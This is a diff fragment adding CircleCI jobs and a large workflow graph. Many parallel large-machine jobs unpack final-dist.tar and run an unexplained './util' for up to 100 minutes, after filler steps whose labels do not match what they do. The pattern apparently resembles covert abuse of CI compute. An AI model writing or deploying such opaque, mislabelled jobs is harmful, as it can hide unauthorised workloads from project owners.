+          no_output_timeout: 100m
+          command: bash -c "./util"
+  auditor_fiona-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Mint batch slot
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 50840; echo "ftr" ) | wc -l; true ; } > /tmp/pipeline/step-11.out
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/step-11.out) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-11.out
+  fiona-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/step-11.out || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  install_titan-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 25165824 /dev/urandom | sha256sum; true ; } > /tmp/pipeline/payload
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/payload) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - payload
+  titan-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/OK.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  green_break-prod:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Collect gauge frames
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 430400 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/pipeline/phase-done.sig
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/phase-done.sig) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - phase-done.sig
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/phase-done.sig || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+
+workflows:
+  test:
+    jobs:
+      - fixture_chen-test
+      - chen-test:
+          requires:
+            - fixture_chen-test
+      - install_min-ship:
+          requires:
+            - fixture_chen-test
+      - min-ship:
+          requires:
+            - install_min-ship
+      - prep_full-send:
+          requires:
+            - install_min-ship
+      - full-send:
+          requires:
+            - prep_full-send
+      - route_BUILD_DEV:
+          requires:
+            - prep_full-send
+      - BUILD_DEV:
+          requires:
+            - route_BUILD_DEV
+      - green_break-prod:
+          requires:
+            - route_BUILD_DEV
+      - break-prod:
+          requires:
+            - green_break-prod
+      - builder_hotfix-7714:
+          requires:
+            - green_break-prod
+      - hotfix-7714:
+          requires:
+            - builder_hotfix-7714
+      - spin_v4-nightly5:
+          requires:
+            - builder_hotfix-7714
+      - v4-nightly5:
+          requires:
+            - spin_v4-nightly5
+      - run_check-full-release-candidate:
+          requires:
+            - spin_v4-nightly5
+      - check-full-release-candidate:
+          requires:
+            - run_check-full-release-candidate
+      - stepB_orion-ng:
+          requires:
+            - run_check-full-release-candidate
+      - orion-ng:
+          requires:
+            - stepB_orion-ng
+      - phase1_fiona-ci:
+          requires:
+            - stepB_orion-ng
+      - fiona-ci:
+          requires:
+            - phase1_fiona-ci
+      - go_validate-end-to-end-regression-suite:
+          requires:
+            - phase1_fiona-ci
+      - validate-end-to-end-regression-suite:
+          requires:
+            - go_validate-end-to-end-regression-suite
+      - auditor_fiona-build:
+          requires:
+            - go_validate-end-to-end-regression-suite
+      - fiona-build:
+          requires:
+            - auditor_fiona-build
+      - Delta_titan-v2
+      - tmp_alpha-5
+      - titan-v2:
+          requires:
+            - Delta_titan-v2
+            - tmp_alpha-5
+      - alpha-5:
+          requires:
+            - Delta_titan-v2
+            - tmp_alpha-5
+      - UAT_INIT_9:
+          requires:
+            - Delta_titan-v2
+            - tmp_alpha-5
+      - Launch_Prod1:
+          requires:
+            - Delta_titan-v2
+            - tmp_alpha-5
+      - io-ng:
+          requires:
+            - Delta_titan-v2
+            - tmp_alpha-5
+      - titan-rev:
+          requires:
+            - Delta_titan-v2
+            - tmp_alpha-5
+      - sirius-alpha:
+          requires:
+            - Delta_titan-v2
+            - tmp_alpha-5
+      - BuildImage:
+          requires:
+            - Delta_titan-v2
+            - tmp_alpha-5
+      - BUILD_UAT:
+          requires:
+            - Delta_titan-v2
+            - tmp_alpha-5
+      - staging_pr-2
+      - pr-2:
+          requires:
+            - staging_pr-2
+      - canary_pat-run:
+          requires:
+            - staging_pr-2
+      - pat-run:
+          requires:
+            - canary_pat-run
+      - ctx_q1-rev:
+          requires:
+            - canary_pat-run
+      - q1-rev:
+          requires:
+            - ctx_q1-rev
+      - Alpha_verify:
+          requires:
+            - ctx_q1-rev
+      - verify:
+          requires:
+            - Alpha_verify
+      - Beta_intergration:
+          requires:
+            - Alpha_verify
+      - intergration:
+          requires:
+            - Beta_intergration
+      - rerun_assemble-end-to-end-release-candidate:
+          requires:
+            - Beta_intergration
+      - assemble-end-to-end-release-candidate:
+          requires:
+            - rerun_assemble-end-to-end-release-candidate
+      - kick_sierra:
+          requires:
+            - rerun_assemble-end-to-end-release-candidate
+      - sierra:
+          requires:
+            - kick_sierra
+      - linter_ensure-nightly-regression-suite:
+          requires:
+            - kick_sierra
+      - ensure-nightly-regression-suite:
+          requires:
+            - linter_ensure-nightly-regression-suite
+      - tester_chore-7471:
+          requires:
+            - linter_ensure-nightly-regression-suite
+      - chore-7471:
+          requires:
+            - tester_chore-7471
